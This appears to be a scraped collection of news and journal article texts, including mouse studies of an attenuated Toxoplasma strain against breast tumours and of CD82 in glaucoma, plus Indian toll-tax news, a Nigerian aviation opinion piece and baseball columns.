Parasite replication and plaque assays were used to examine the effects of the OMPDC gene on the intracellular proliferation of T. gondii. The parasite replication assay showed that at 24 h post infection the number of RH-WT tachyzoites per PV was significantly higher than that of the RH-Δompdc mutant in the absence of uracil. The number of tachyzoites per PV of the RH-Δompdc mutant supplied with uracil was remarkably higher than that supplied without uracil although uracil addition not did not affect the proliferation of the RH-WT strain (Fig. 1a–c). These results indicated that the proliferation of the RH-Δompdc mutant was significantly inhibited in the absence of uracil and that uracil addition could rescue the reduced proliferation phenotype of the RH-Δompdc mutant. Plaque assay results showed us that the RH-Δompdc auxotroph could grow normally in the presence of uracil to form plaques but it failed to do so in the absence of uracil. However the RH-WT strain was able to grow normally in the culture medium with or without uracil (Fig. 1d e). These results led us to conclude that the OMPDC gene was essential to the proliferation and growth of T. gondii in vitro and that the replication of the RH-Δompdc mutant could be recovered by uracil supplement.

RH-Δompdc infection significantly increased the transcription levels of proinflammatory cytokines in vitro

Proinflammatory cytokines which are predominantly produced by activated immune cells play central roles in inflammatory diseases. To investigate the ability of the RH-Δompdc auxotroph to activate macrophages and induce host immune responses we measured the transcription levels of the cytokines in RAW264.7 cells in the absence of uracil. RAW264.7 cells were infected with RH-WT and RH-Δompdc tachyzoites without uracil supplement for 24 h following which the total RNA was extracted and the mRNA levels of cytokines were detected by qRT-PCR. The relative transcription levels of IL-12 IL-6 IL-1β iNOS and TNF-α were significantly increased after T. gondii infection in RAW264.7 cells regardless of OMPDC gene deletion (Fig. 2). These results indicated that RH-Δompdc infection significantly increased the transcription levels of proinflammatory cytokines and may induce strong immune responses in hosts.

The relative transcription levels of IL-12p40 (a) IL-6 (b) IL-1β (c) iNOS (d) and TNF-α (e) normalized with GAPDH were significantly increased in both RH-WT and RH-Δompdc infection groups compared to the control group.

Vaccination with the avirulent RH-Δompdc protected the mice from infection by virulent RH strain

To estimate the virulence of the RH-Δompdc mutant in vivo BALB/c mice were inoculated i.p. with the RH-WT and RH-Δompdc tachyzoites. Those mice infected with 100 RH-WT tachyzoites each died within 10 days while all mice infected with 106 or 2 × 106 RH-Δompdc tachyzoites survived (Fig. 3a). These results indicated that the virulence of the RH-Δompdc mutant was severely attenuated. The protective effects of the RH-Δompdc immunization on mice against its parental RH strain infection were further assessed. Mice were immunized (i.p.) with PBS or with 106 or 2 × 106 RH-Δompdc tachyzoites for 30 days and then challenged with 100 RH-WT tachyzoites. At the end of the 30-day observation period the survival rate of the mice vaccinated with 106 RH-Δompdc tachyzoites was 71.4% and that of the mice vaccinated with 2 × 106 tachyzoites was 100% (Fig. 3b). These results demonstrated that RH-Δompdc was avirulent in mice and that vaccination with this mutant could protect mice from reinfection by its parental virulent RH strain.

Mice (n = 8) infected with 100 RH-WT tachyzoites (i.p.) all died within 10 days and mice (n = 8) infected with 106 or 2 × 106 RH-Δompdc tachyzoites (i.p.) all survived. b RH-Δompdc immunization provided protection against RH-WT infection.

RH-Δompdc could not propagate in mice but could induce intense immune responses during acute infection

The proliferative ability of RH-Δompdc in mice and the levels of the cytokines IL-12 and IFN-γ in mice serum were further assessed. Mice were infected with 106 tachyzoites of RH-WT and RH-Δompdc by i.p. injection and the parasite burden in the peritoneal fluids was subsequently examined by qPCR at 12 h 24 h and 5 days after infection. At 24 h post infection RH-WT displayed robust replication and high parasite burden in the peritoneal fluids while RH-Δompdc showed a significant reduction in intraperitoneal parasites and was eliminated within 5 days after infection (Fig. 4a). The mice sera were collected at different time points after infection for the detection of the Th1 cytokines IL-12 and IFN-γ. The levels of IL-12 and IFN-γ in the serum were significantly upregulated after RH-WT and RH-Δompdc infection (Fig. 4b c). This result indicated that RH-Δompdc induced strong host immune responses similarly to its parental RH strain. However in the RH-Δompdc infection group the levels of IL-12 and IFN-γ first increased and then rapidly declined although they were still remarkably higher than those in the control group at 5 days past infection (Fig. 4b c). In brief RH-Δompdc could be rapidly cleared in mice but also induced a strong immune responses as with its parental RH strain.

The 6- to 8-week-old BALB/c mice were infected with 106 RH-WT and RH-Δompdc tachyzoites (i.p.) and the parasite burden in the peritoneal fluids and the levels of IL-12 and IFN-γ in the serum were detected at 0 12 24 h and 5 d post infection. a The parasite burden in the peritoneal fluids of mice (n = 4) infected with RH-WT and RH-Δompdc tachyzoites was detected at the indicated time post infection.

The highly attenuated T. gondii strain RH-Δompdc inhibited 4T1 tumor growth

The 4T1 breast carcinoma is derived from BALB/c mice and shows many common characteristics with the naturally occurring human TNBC. Therefore this carcinoma is widely used as a tumor model to evaluate the therapeutic approaches for human mammary carcinoma. We assessed the efficacy of RH-Δompdc for treating 4T1 murine breast cancer. RH-Δompdc tachyzoites were inoculated i.t. at a dose of 106 tachyzoites per injection. The treatments were administered every 7 days for a total of four times (Fig. 5a). The RH-Δompdc treatment was well-tolerated by mice with no significant body weight loss in the treatment and control groups throughout the observation period (Fig. 5b). However the RH-Δompdc treatment remarkably inhibited tumor growth. The weight and volume of the tumors significantly decreased in the RH-Δompdc treatment group compared to the PBS treatment group (Fig. 5c d). At 20 days after the initial treatment tumor volumes in the PBS treatment group were approximately threefold larger than those in the RH-Δompdc treatment group (Fig. 5d). The RH-Δompdc treatment also significantly improved the survival of the tumor-bearing mice with a median survival of 56 days compared to only 36 days in the PBS treatment group (Fig. 5e). These results indicated that anti-tumor immune responses were induced after RH-Δompdc in situ inoculation into 4T1 tumors leading to the inhibition of tumor growth and improved survival of the 4T1 tumor-bearing mice.

RH-Δompdc treatment inhibited 4T1 cell lung metastasis

4T1 metastatic disease spontaneously develops in the lungs of mice from the primary tumor as early as 8 days post inoculation with increasing tumor burden at later time points [46]. In 4T1 tumor-bearing mice lung metastasis is characterized by the infiltration of myeloid-derived suppressor cells and granulocytes [47]. The RH-Δompdc treatment of 4T1 tumors was carried out as described in the Methods section. The lungs of the mice were harvested on day 13 after the first treatment stained with H&E and observed under a light microscope. Fewer infiltrating myeloid cells and larger alveoli spaces were found in the lung tissue of RH-Δompdc treatment group compared to that of the PBS group (Fig. 6a). The results indicated that extensive metastatic tumors had formed in the lungs of PBS-treated mice and that the lung architecture of RH-Δompdc-treated mice was similar to that of the healthy mice (Fig. 6a). The Ki67 protein a non-histone nuclear protein is widely used as a proliferation marker for tumor cells. Due to the lack of specific markers for metastatic 4T1 tumor cells we detected the 4T1 cells in lungs by immunohistochemical staining with the Ki67 antibody. The results showed that the number of Ki67-positive cells was significantly reduced in the RH-Δompdc treatment group compared to the PBS group (Fig. 6b). The quantification of stained sections also showed a significant reduction in the number of Ki67-positive cells in the lung tissues of the RH-Δompdc treatment group compared to the PBS group (Fig. 6c). In summary the RH-Δompdc treatment was able to effectively inhibit the 4T1 lung metastasis.

Fig. 6 RH-Δompdc treatment inhibited 4T1 cell lung metastasis.

RH-Δompdc treatment increased the IL-12 and IFN-γ level in both the serum and tumor microenvironment (TME)

Cytokines such as the proinflammatory cytokines IL-12 and IFN-γ play crucial roles in inhibiting the progression of breast cancer so cytokine analysis of the serum and TME may provide important clues about the immunomodulatory effects of RH-Δompdc treatment. Following RH-Δompdc in situ inoculation to the 4T1 tumor we determined the cytokine levels by ELISA in serum and homogenized tumor lysate collected 1 8 and 13 days after the first treatment. The levels of IL-12 and IFN-γ in the RH-Δompdc treatment group were significantly upregulated in both the serum and TME as compared to the PBS group (Fig. 7). However the levels of IL-12 and IFN-γ were decreased in both the serum and TME on day 13 after the first treatment (Fig. 7). Overall the higher expression levels of IL-12 and IFN-γ induced by the RH-Δompdc treatment implied that this uracil auxotroph T. gondii may activate immune cells and induce anti-tumor immune responses.",https://news.google.com/articles/CBMiMmh0dHBzOi8vd3d3Lm5hdHVyZS5jb20vYXJ0aWNsZXMvczQxNDE5LTAyMS0wNDQ0NS020gEA?hl=en-US&gl=US&ceid=US%3Aen,CD82 protects against glaucomatous axonal transport deficits via mTORC1 activation in mice | Cell Death & Disease,"CD82 expression was downregulated in the retina ONH and ON in the early stage after the establishment of an acute ocular hypertension (AOHT) model

The protein levels of CD82 in the retina unmyelinated optic nerve head (ONH) and posterior myelinated optic nerve (ON) were detected at different timepoints after AOHT. As shown in Fig. 1a the results were similar across all three sites. CD82 immunofluorescence started to decline as early as 8 h reached its lowest level on Day 2 and partially recovered on Day 7. The western blot analysis of the CD82 protein levels were consistent with the immunofluorescence staining (Fig. 1b−e).

Subsequently we explored the cellular localization of CD82 in the posterior segment of the eye. Immunofluorescent double-labeling of CD82 with cell markers of RGCs (Tuj1) microglia (Iba1) and astrocytes (GAFP) was performed (Fig. 1f−h). It was apparent that CD82 was mainly localized parallel to the RGC marker Tuj1 but rarely colabeled with Iba1 or GAFP regardless of modeling suggesting that CD82 mainly functions in RGCs and their axons rather than in other glial cells.

CD82 overexpression in the retina and ON was achieved by intravitreal injection of recombinant adeno-associated virus rAAV2/9-Cd82-mCherry

To investigate the role of CD82 in the ocular hypertension mouse model an adeno-associated virus vector was designed to overexpress CD82 in the mouse retina. rAAV2/9-Cd82-mCherry or rAAV2/9-mCherry (vehicle) was intravitreally injected 28 days before the mice were sacrificed and the CD82 protein overexpression efficiency was verified by immunofluorescence and western blot analysis. It was evident that the CD82 immunofluorescence intensity in the AAV-Cd82 injection group was much higher than that in the vehicle and control groups covering the retina and ONH and particularly pronounced in the optic nerve (Fig. 2a). The western blot results also revealed satisfactory transfection efficiency (Fig. 2b c). Immunofluorescence of the virus tag mCherry colabeled with Tuj1 is presented in Fig. S1.

CD82 overexpression protected against axonal transport deficits after AOHT

Here we focused on lesions in the ONH which is a critical site in glaucoma optic neuropathy [33] and the superior colliculus (SC) which is the primary projection site of RGCs in the rodent brain [3].

First we visualized the anterograde transport function of the optic nerve by an intraocular injection of cholera toxin β-subunit (CTB) which labeled the entire retinal projection via active uptake and transport (Fig. 3a b). Sections of ONH showed that CTB was uniformly distributed along the entire axon length (>2000 μm) in the sham group. Furthermore after inducing AOHT CTB failed to be transported distantly with a severe obstacle on Day 2 (<200 μm) and slight recovery on Day 7 (Fig. 3c d). Notably the CD82 overexpression reversed this obstruction and maintained the CTB labeling distance at over 400 μm on Day 2.

The CTB signal density in SC was observed in three layers rostral middle and caudal from consecutive serial sections and showed disruption of transport reaching the brain. In the control group SC had a complete CTB distribution reflecting entire retinotopic transportation to SC (Fig. 3e). After AOHT there was a heterogeneous distribution of CTB signals with massive deficits in all three layers. In contrast SCs from AOHT mice injected with AAV-Cd82 manifested a lower loss of CTB labeling.

Subsequently we evaluated endogenous cargo transport by immunofluorescence staining of synaptophysin a vesicular transport marker synthesized by RGCs and anterogradely transported along the ON. Under normal conditions there was no protein accumulation in the ONH. However synaptophysin protein began to deposit at the ONH within 8 h after the AOHT modeling and peaked on Day 2 which is similar to the foregoing cases. In the AAV-Cd82 injection group such accumulation was alleviated (Fig. 3f). Proteins extracted from the ONH were used for a western blot analysis. An increase in synaptophysin protein in the ONH was evident after the modeling and the protective effect of CD82 was verified (Fig. 3g−j).

CD82 overexpression protected the optic nerve from axonal degeneration induced by AOHT

Optic nerve axonal degeneration was the following pathological event due to axonal transport deficits and was more severe and difficult to reverse. Here we detected axonal degeneration changes in the optic nerve after AOHT.

Radial cord-like immunofluorescence staining of Tuj1 in the nerve fiber layer demonstrated the axons of ganglion cells. Axon loss occurred in AOHT group which showed weakened immunofluorescence and sparser axon distribution. With CD82 overexpression the axon distribution was nearly intact (Fig. 4a b). However there was no significant loss of RGC soma at this stage indicating that axonal degeneration is an early pathological change prior to RGC death (Fig. 4c). The existing time lag between earlier axon loss and later RGC body death is consistent with previous findings [34].

Electron microscopy showed the ultrastructural pathological changes of RGC axonal degeneration [35 36]. Representative images of control AOHT and CD82 intervention groups are shown in Fig. 4d. In the normal group compact layers of myelin lamellae surrounded the axons. However two days after AOHT myelinated axons appeared to be delaminated with intramyelinic lacunae or vacuoles. Myelin debris and axonal swellings were frequently observed and the emergence of almost collapsed axon structures with multilayered whorled masses indicated axons toward the end stage of degeneration. To quantify the degree of damage the proportion of axons with normal loosened or decompacted myelin was calculated (Fig. 4e). In the AOHT group most myelin sheath was loosened with another considerable fraction decompacted. With CD82 overexpression this impairment was alleviated and close to normal. Myelinated axon counts also reflected the protective role of CD82 in AOHT model (Fig. 4f).

Extensive studies have revealed that β-amyloid precursor protein (Aβ) is involved in glaucomatous neuropathology [37] and Aβ has emerged as a hallmark of neurodegeneration [38 39]. As shown in Fig. 4g h axons immunoreactive to Aβ were present to a significantly lower degree in the CD82-overexpressing mice than the vehicle-treated group after modeling.

To further verify the protective effect of CD82 overexpression in vitro we used retinoic acid (RA)-differentiated SH-SY5Y cells [40] as well as mouse primary hippocampal neuron for neurite outgrowth assays. H 2 O 2 (100 μM) was applied to imitate cell injury in retinal degeneration [41]. As shown in Fig. 4i−k H 2 O 2 led to cell process retraction and inhibited the neurite length of both cells. With CD82 overexpression axonal outgrowth was almost restored to the normal state after H 2 O 2 injury.

CD82 overexpression promoted axon regeneration RGC survival and visual function in an optic nerve crush (ONC) model

Currently there are limited means to reverse optic nerve damage and restore eyesight in late-stage glaucoma with extensive axonal injury and RGC loss [42]. Here we induced CD82 overexpression in a more dramatic injury model namely optic nerve crush (ONC) which led to evident neuronal loss and rapid axonal damage by directly interrupting axoplasmic transport [43] comparable to advanced glaucoma (Fig. 5a).

Fig. 5: CD82 overexpression promoted axon regeneration RGC survival and visual function after optic nerve crush. a Timeline of the major procedures for exploring optic nerve regeneration and RGC survival after ONC. b Representative images showing axonal regeneration of optic nerve 14 or 28 days after ONC with or without CD82 overexpression.

Figure 5b presents typical images of CTB-traced axon regeneration after ONC. Regenerating and sprouting RGC axon fibers extended over 1 mm beyond the crush site on Day 14 and extended to 2 mm on Day 28 under the condition of CD82 overexpression with no visible regeneration in the injury-only group regardless of the recovery time (Fig. 5c). In addition RGC survival was evaluated by RBPMS immunofluorescence staining in retinal flat mounts 7 days after ONC (Fig. 5d). The promotion of RGC survival following the CD82 overexpression was significant in the central retina while the effect in the peripheral area was not as evident (Fig. 5e f).

Then we tested the function of RGCs through mouse visual function tests. Dark/light preference tests were performed to measure the light perception (LP) of mice with bilateral ONC; during the test a reduced duration in the dark compartment reflected a loss of vision (Fig. 5g). The tests revealed that the ratio of time in the light/dark was increased after ONC and significantly recovered in the CD82 overexpression group at both time points indicating a restoration of LP after the treatment with CD82 (Fig. 5h). High-contrast visual stimulation was performed to measure the optomotor response to reflect the visual acuity of the mice (Fig. 5i). The high spatial frequency threshold indicated improved visual acuity in the AAV-Cd82-injected mice compared to that in the injury-only group on Day 28 after bilateral ONC (Fig. 5j). Overall the restored vision-dependent behavior of the mice following CD82 overexpression demonstrated its ability to improve visual function after optic nerve injury.

CD82 overexpression protected against axonal transport deficits through an mTORC1-dependent mechanism

The mTOR signaling pathway is critical for regulating neuronal function. Subsequently we speculated whether the mTOR pathway is required for the CD82-mediated protective effects. The western blot analysis shown in Fig. 6a b illustrated that phosphorylated-pS6K was downregulated in the H 2 O 2 -treated cells but recovered following CD82 overexpression. Furthermore the CD82-induced increase in phosphorylated pS6K was blocked by rapamycin a potent and specific inhibitor of mTOR confirming the participation of the mTORC1 pathway downstream of CD82 (Fig. 6c d). These regulatory relations could also be corroborated in retinal tissues as shown in Fig. 6e. The double immunofluorescence staining in retinal flat mounts of phosphorylated S6 and the RGC marker Tuj1 was decreased in the AOHT group while the CD82 overexpression prevented this decline. The treatment with rapamycin diminished the signal activation effect of CD82.

To further validate the role of mTORC1 activity in regulating the axonal transport function promoted by CD82 we repeated the previous experiments with the addition of rapamycin treatment every two days for 28 days to block mTOR activity in vivo. In this case the overexpression of CD82 failed to relieve the axonal transport deficits induced by AOHT which manifested in the accumulation of synaptophysin protein at the ONH (Fig. 6h) and impairment in CTB transport from the eye to SC (Fig. 6f g). Considering the confounding effect of the pharmacological inhibitor rapamycin due to systemic drug administration and low tissue specificity we used conditional knockout mice to target RGCs by injecting AAV-hsyn-cre into the vitreous body of Rptorfl/fl mice to delete Raptor the exclusive functional component of mTORC1 to verify the specific effect of the mTORC1 pathway in RGCs (Fig. 6i). The results of the species identification and the Raptor knockdown efficiency in the retina are shown in Fig. S2. Figure 6j k illustrates the deactivation of the mTORC1 pathway in the Cre-injected eyes from the Rptorfl/fl mice. The assessment of axonal transport shown in Fig. 6l−n was consistent with the previous results showing that the inhibition of mTORC1 activity in RGCs blocked the protective effects of CD82.

CD82 activated mTORC1 via TRAF2-mediated k63-linked ubiquitylation to protect against neurodegeneration

Subsequently the molecular pathway by which CD82 influences mTORC1 activation was addressed. We utilized the Molecular Interaction Search Tool (MIST) database to extract hub molecules connected to CD82 and mTORC1 from the protein–protein interaction (PPI) network. The consequent protein interaction map was visualized by Cytoscape software. The node size reflected the compositive correlation between the candidate proteins and CD82 and mTOR. As demonstrated in Fig. 7a tumor necrosis factor receptor-associated factor 2 (TRAF2) was the most likely intermediate molecule due to its direct association with both target proteins (Fig. 7b). Then we examined the mRNA level of Traf2 by RT–PCR (Fig. 7c). Further western blot analysis was consistent with the PCR results indicating that CD82 overexpression caused the upregulation of TRAF2 (Fig. 7d e). To verify our ex vivo findings in vivo we evaluated the expression of TRAF2 in the mouse retina. Figure 7f shows that the expression of TRAF2 in Tuj1-positive GCL was markedly decreased while the CD82 overexpression suppressed this decrease. The results above indicate that TRAF2 is a downstream effector regulated by CD82.

Full size image

The impact of the CD82-induced upregulation of TRAF2 on mTORC1 activation was explored by a western blot analysis of phosphorylated pS6K. The CD82 overexpression led to increased protein levels of TRAF2 which in turn activated the mTORC1 pathway (Fig. 7g h). To validate whether the CD82-induced activation effect was dependent on TRAF2 we used siRNA to knockdown Traf2 in Cd82-overexpressing cells. In this case CD82 was no longer capable of activating the downstream phosphorylation of pS6K (Fig. 7g h) indicating a TRAF2-dependent mechanism underlying the CD82-induced effect.

It has been demonstrated that K63-linked ubiquitination regulates the activity of mTORC1 [44 45]. Therefore we speculated that TRAF2-mediated K63-linked ubiquitination participates in mTORC1 activation. As shown in Fig. 7i j a high level of K63-linked ubiquitination was observed in the CD82-overexpressing cells which was attenuated by siTraf2 transfection. Therefore we are confident that CD82 acted by upregulating TRAF2 which was capable of ubiquitinating RAPTOR to govern mTORC1 activation. Further coimmunofluorescence analysis demonstrated increased colocalization of RAPTOR with the lysosomal marker LAMP-1 in the CD82-overexpressing SH-SY5Y cells which was reduced in the siTraf2-transfected cells (Fig. 7k l).

Finally we tested the effect of TRAF2 on neurodegenerative pathology with a neurite outgrowth assay. Figure 7m n shows that the CD82-induced outgrowth-promoting capability was retarded by siTraf2 confirming that CD82 protected against neurodegeneration through the positive regulation of TRAF2.",,,,,,

Rajinder Kumar

Nawanshehr December 11 2021: As farmers were preparing to wind up their Kisan Morcha after tasting victory at Delhi borders companies managing Toll Plazas have started preparations to impose heavy toll taxes at their check points. As per reports toll tax rates have been increased by more than 80 percent at most of places.

At Behram Toll plaza travelers who used to pay Rs. 50 for travelling between Phagwara and Nawanshehr will have to pay Rs. 90 now. Similarly for travelling for more than once travllers used to pay Rs. 75 which has been increased to Rs. 135.

Likewise for Commercial load carrying vehicles and Minni Vehicles toll tax was Rs. 80 which has been increased to Rs. 145. For travelling more than once these vehicles use to pay Rs. 115 and this has been increased to Rs. 215. For Buses and Truck toll tax for single trip was Rs. 165 which has been increased to Rs. 300 and for multiple trips they will have to shell out Rs. 450 instead of Rs. 245 earlier.

According to sources toll tax rates have been revised on all toll plazas similarly. It is still not clear as to from which date toll tax will get imposed as farmers of Punjab have decided to lift their dharnas on December 15.",https://news.google.com/articles/CBMia2h0dHBzOi8vMjQ3dXJlcG9ydHMuY29tLzIwMjEvMTIvYWlyLXBlYWNlLWVtaXJhdGVzLWFpcmxpbmUtYW5kLWZncy1yZWNpcHJvY2FsLWFjdGlvbi1ieS1jaGlkaWViZXJlLW53b2JvZG8v0gEA?hl=en-US&gl=US&ceid=US%3Aen,Air Peace Emirates Airline and FG's Reciprocal Action - By Chidiebere Nwobodo,"Despite swirling challenges facing the nation this is one of the good times to be a proud Nigerian! President Buhari-led government has made me proud. The recent reciprocal reduction of Emirates flights to Nigeria from twenty-one per week to just once in retaliation to UAE’s limitation of Air Peace’s flights to Dubai via Sharjar Airport to one flight per week has sent an assuring message that the federal government will go full length to protect interests of indigenous airlines and Nigerian air travelers.

Gone are the days when indigenous airlines would be left in the winter cold of crippling politics of foreign airlines and its attendant grave implications for Nigerians on the international routes. Nigerians are among the most mobile humans on this planet—we travel a lot. Nigerian route is one of the busiest in the world yet Nigerian airlines have not really benefited from this huge traffic of the most populous black nation.

Behemoth cum legacy airlines have been using their different home governments to frustrate Nigerian airlines from consolidating in the international routes; thereby monopolising the routes while Nigerian travelers are left at their mercy of arbitrary fares and other forms of exploitative tendencies. I think we have reached elastic limit of tolerating these excesses. Never again!

They had gotten away with this impunity and discriminatory actions in the past because previous administrations did not stand up to these economic bullies but Aviation Ministry under Hadi Seriki is making a difference. No injustice lasts forever. Every serious government of the world defends the interests of its indigenous companies against predatory actions of other nations. I am very happy that our government has etched this belief in its consciousness.

In February of this year UAE employed fight against Covid-19 as a smokescreen to frustrate Air Peace Airline from coming to Sharjar using “Rapid Antigen Test” as a flimsy excuse. Federal Government reciprocated by stopping Emirates flights to Nigeria. When UAE had a rethink on the Rapid Antigen Test requirement Nigerian authorities lifted the ban on Emirates flights.

The foregoing contest forms the crux of the matter. While Emirates announced flights resumption to Nigeria starting from 5th December 2021 it never wanted Air Peace to resume its flights on Dubai route. Emirates Airline loves to retain its age-longed monopoly of the route but has gotten more than its bargained. Not withstanding several warnings from Nigerian aviation authorities to UAE’s government to allow Air Peace’s flights to Sharjar Airport at least three times per week it fell on deaf ears.

UAE even went further to reduce Air Peace’s flights to just once per week. What a diplomatic imprudence! Emirates had permission for 21 flights into Nigeria per week yet UAE could not allow Air Peace just three flights per week. Nigerian Civil Aviation Authority got infuriated in commendable reciprocity and display of regulatory acumen reduced Emirates flights to one per week. Applause! Who losses more? Emirates!

Henceforth it should be an eye for an eye. This is akin to having 21 slots in my country and refusing me just 3 slots in your own country. Even in a jungle such brazen impunity is not tolerated for long. Nigeria is a country plagued with rising unemployment rate. In fact debilitating insecurity in the country is tied to youth unemployment. Imagine how many thousands of jobs with its corresponding economic opportunities that would be created for Nigerians if our indigenous airlines are adequately supported to compete strongly in the international routes with other foreign airlines.

When AriseTV contracted Air Peace to airlift its crew and invitees to the Arise Dubai Show recently UAE authorities barred their fangs. If not for the prompt intervention of Nigerian government that chartered flight would have been aborted. As if that was not enough they mischievously refused to allow Air Peace resume its normal scheduled flight operations into the Sharjar Airport immediately after the AriseTV-charter flight while Emirates had resumed operations into Nigeria; flying twice daily to Lagos and once daily to Abuja.

This is outrageously unacceptable! Once again I want to commend President Muhammadu Buhari Minister of Aviation Hadi Seriki and Capt. Musa Nuhu director-general of Nigerian Civil Aviation Authority (NCAA) for rising to the occasion in defense of indigenous airlines. It is a humiliating aberration that foreign airlines whose home countries make flight operations difficult for our indigenous airlines over there will be allowed to have a free reign here at our expenses as if ours is a banana republic.

Emirates have been fleecing unsuspecting Nigerian travelers for months now by deliberately announcing flights resumptions on dates they knew would never happen because of flight ban between UAE and Nigeria. It is alarming that this foreign airline made Nigerians pay for non-existent flights. They never refunded them but rather they told these hapless Nigerian travelers to reschedule their flights when the Airline begins operation.

This is synonymous to obtaining money under false pretenses and can be considered criminal acts. Emirates perpetrated this illegality for four consecutive times before NCAA threatened weighty sanctions. Can Air Peace or any other Nigerian airline exhibit a fraction of this impunity in UAE or any other country without being blacklisted as “fraudulent” and its owners blackmailed as “criminals” in the eyes of the world. Not at all.

As response to Nigerian authorities reciprocal decision to cap its flights to one Emirates Airline has suspended its flights in and out of the country till further notice—hopefully to enable UAE government and Nigerian authorities resolve the diplomatic logjam. Emirates should not be given 21 slots of flights in Nigeria while Air Peace begs to get three in UAE. Why won’t Air Peace have the same 21 slots in UAE as Emirates was having in Nigeria before the ban?

It should be equal slots—if UAE concedes three slots to us we reciprocate with exact amount of slots. Air Peace has enough planes in its fleet to exhaust similar number of slots that was given to Emirates. With additional 13 brand new E195-E2 airplanes Air Peace is prepared to give Emirates Airline a run for its money on the ever-busy Dubai route.

Supporting indigenous airlines to withstand stiff competition cum aerospace politics in the international routes is another window to earn foreign exchange aside crude oil. We should position our indigenous companies to join the scramble for global resources instead of over-concentration on the limited petrodollars. Nigerian government deserves commendation for standing up for indigenous companies against diplomatic bullying of foreign authorities.

Alonso played three years of college ball at the University of Florida whereas Vientos was drafted out of high school.

By the time Alonso entered the 2018 season he was not only two years older than Vientos was this past year but he had also played 378 games since high school as opposed to Vientos who had played just 222. The learning curve was much steeper for Vientos yet the power translated in a similar way.

Now this is not me making the argument for why Vientos is going to be a better hitter then Alonso. But instead this is to point out that these two sluggers are not that different and the Mets may have another 40-home run guy waiting in the wings right now. They just have to give him the opportunity.

Where Vientos Fits on the 2022 New York Mets

So many times with prospects we focus on their liabilities instead of keying in on their strengths. With Vientos the questions we have about him as a prospect are all tied to his glove similar to Alonso three years ago.

Vientos was drafted as a shortstop but was quickly moved over to third base once he hit the Mets farm system. Despite having a big arm Vientos has not yet proven he is capable of playing third base at the big league level which has even led the Mets to trying him in a corner outfield spot at times instead.

There is no doubt he is going to have to work hard on his defense just like Alonso did but focusing on that is ignoring all of his incredible strengths that could have him be an impact player for the Mets as soon as next season. Also with the universal DH likely being worked into the new CBA Vientos could have a path into the Mets starting lineup where no glove is even required.",https://news.google.com/articles/CBMiX2h0dHBzOi8vd3d3LnBvc3RidWxsZXRpbi5jb20vb3Bpbmlvbi9jb2x1bW5zL3N0ZXBoZW4tbC1jYXJ0ZXItYmFzZWJhbGwtcGxheWVycy1hcmUtbm90LW92ZXJwYWlk0gEA?hl=en-US&gl=US&ceid=US%3Aen,Stephen L. Carter: Baseball players are not overpaid,"As Major League Baseball enters its first labor stoppage in almost 30 years I have two pieces of advice for my fellow fans — one reassuring and one pleading. First do not be unduly alarmed; the lockout is mainly theater. Second do not fall for the canard that those who play the world’s most beautiful and difficult sport are overpaid.

As to the theater: Owners locked out the players after declaring an impasse in the negotiation over a new collective bargaining agreement. Management and players are largely barred from contact until the lockout ends. But the first preseason games aren’t scheduled until late February; the season that counts won’t begin until late March.

In short there’s plenty of time to negotiate a new agreement before anything real is at stake. That both sides understand this aspect of the non-crisis helps explain why agents and owners rushed to finalize huge contracts for big stars in the days before the stoppage.

After all whatever happens it’s unlikely that players will wind up on the losing end of the ultimate settlement. In general whether interruptions have resulted from strikes by players or lockouts by owners the results have been the same: In the words of the economist Michael Haupert “The players won the concessions they demanded and fended off attempts by owners to reverse previous player gains.”

Owners' side

All of which brings us to the other issue: what the sportswriter Will Leitch has recently called “a strange contingent of fans” that sides with baseball’s owners in the sport’s labor disputes. Leitch puts this tendency down to the players’ relative visibility. The owner isn’t out there taking a called third strike in the eighth inning with the go-ahead run in scoring position.

ADVERTISEMENT

I worry however that taking the side of baseball owners in labor disputes is a symptom not a cause; the underlying problem is that millions of fans think that player salaries are too high. (Sportswriters in the past showed the same tendency to side with management. Recent work has even suggested that the negative media attention often garnered by players who are union activists reduces their chances at being voted into the Hall of Fame. Yes the sample size is small.)

Decrying this sentiment nearly two decades ago the economist Alan Sanderson pronounced himself puzzled by its persistence. Why don’t we complain he asked about earnings of the top rock stars or actors or novelists?

Good question. Just before the shutdown pitcher Max Scherzer signed a three-year contract with the New York Mets that will pay him an average of $40 million a year — the highest annual salary in the history of baseball. What a piker. According to Forbes Kylie Jenner earned almost 15 times that amount in 2020. Kanye West more than tripled it. As for novelists James Patterson took home $80 million; J.K. Rowling made $60 million. Overall Forbes lists some 50 celebrities who took home more than Scherzer is going to earn.

All without raising the ire of their fans.

Up close and personal

One reason often suggested for the distinction is that fans can observe the value of a great movie or song directly — by enjoying it — whereas the player is evaluated according to wins and losses. Another is that even now fans see their relationships with players as more personal than those with a favorite author or actor.

A more intriguing possibility stems from the nature of contracts. In sports as elsewhere it’s tough for employers to get salaries right. A wage is based on an estimate of future productivity but in baseball a lot of information is hidden. A 2009 study found that stars peak an average of two years later than other players; once past their peaks they deteriorate faster.

Management is perfectly aware of this trend and compensates by signing stars but not other players to long-term contracts. Typically these deals are back-loaded — either explicitly with a higher salary in the out years or implicitly through contracts that underpay stars near their peak and overpay them as they decline.

One reason such a structure makes sense is that the deteriorating star might remain for several years more valuable to the team than what sabermetricians call a replacement-level player. And even when this turns out not to be true the contract could still have been a good bet because stars typically bring value to a team beyond the result on the field. (For example higher attendance.)

ADVERTISEMENT

Sitting up in the bleachers an angry fan might miss this nuance. In a call to talk radio he might complain that Mighty Casey is being paid $25 million a year even though he isn’t hitting home runs the way he used to. What this fan might not remember is that Casey was earning the same amount or maybe less back when he was smashing round-trippers at a rate that was worth much more.

Further complicating the calculation is the fact that contending teams will pay a premium averaging about 40% for players they believe will get them into post-season play. This seeming contradiction makes sense. The superstar might add more wins to a weaker club but the smaller number of wins he adds to a stronger club might be enough to get the team closer to the crown — and the crown adds enormous team value.

None of this is to say that fans who support management are wrong. It’s merely to note that those who side with the owners should offer a better argument than the casual claim that the amazingly gifted men on the field earn too much money.

TSN,Tyson Foods,https://news.google.com/articles/CBMidGh0dHBzOi8vd3d3LnNvdXRoYmVuZHRyaWJ1bmUuY29tL3N0b3J5L2J1c2luZXNzLzIwMjEvMTIvMTEvdHlzb24tZm9vZHMtbWVhdHBhY2tpbmctaXNudC1jaGlja2Vucy1hbnltb3JlLzY0MzM1MDgwMDEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Tyson Foods: Meatpacking isn't for chickens anymore,"Alan Guebert

People have strange hobbies.

For example a Great Plains friend of mine once trained a chicken to play dead. Remarkably on command his chicken would take a whole-body flop that could have taught Steve Martin a thing or two about physical comedy.

